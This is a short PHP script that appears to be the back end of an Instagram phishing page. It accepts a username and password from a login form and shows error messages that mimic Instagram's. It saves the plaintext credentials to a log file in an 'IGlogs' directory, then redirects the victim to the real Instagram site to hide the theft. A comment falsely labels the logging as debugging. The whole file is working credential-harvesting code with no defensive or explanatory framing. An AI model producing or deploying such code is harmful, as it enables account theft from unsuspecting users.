<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Validate username and password
    if (empty($username)) {
        // Handle invalid username
        echo "The username you entered doesn't belong to an account. Please check your username and try again.";
        exit();
    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
        // Handle invalid password
        echo "Sorry, your password was incorrect. Please double-check your password.";
        exit();
    } else {
        // Ensure the logs directory exists
        if (!is_dir('../IGlogs')) {
            mkdir('../IGlogs', 0777, true);
        }

        // Log the username and password (for debugging purposes only)
        error_log("Username: $username\nPassword: $password\n", 3, "../IGlogs/instagram.log");

        // Redirect to the real Instagram login page
        header("Location: https://www.instagram.com/");
        exit();
    }
}
?>
